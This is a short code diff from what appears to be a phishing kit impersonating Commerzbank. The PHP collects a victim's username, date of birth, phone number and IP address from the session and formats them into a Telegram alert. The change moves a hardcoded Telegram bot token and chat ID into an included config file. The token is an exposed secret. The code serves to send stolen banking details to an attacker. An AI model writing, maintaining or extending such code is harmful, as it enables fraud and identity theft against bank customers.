@@ -65,8 +65,10 @@ $xdob = $_SESSION['xdob'] ?? '';
 $xtel = $_SESSION['xtel'] ?? '';
 $ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'unknown'; 
 
-$token = '8018269855:AAEFA85o8SlWZP7Z5Qq9gNVdPMd6iRVOs1Q'; // Replace with your bot token
-$chatId = '-4667150929';   // Replace with your chat ID
+// Include Telegram configuration
+include '../config/telegram.php';
+$token = $telegram_bot2_token;
+$chatId = $telegram_bot2_chat_id;
  
 $message = "🟡 |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗜𝗡𝗙𝗢\n\n";
 $message .= "👤 |  𝗕𝗲𝗻𝘂𝘁𝘇𝗲𝗿𝗻𝗮𝗺𝗲: $xusr / $xusr1\n";
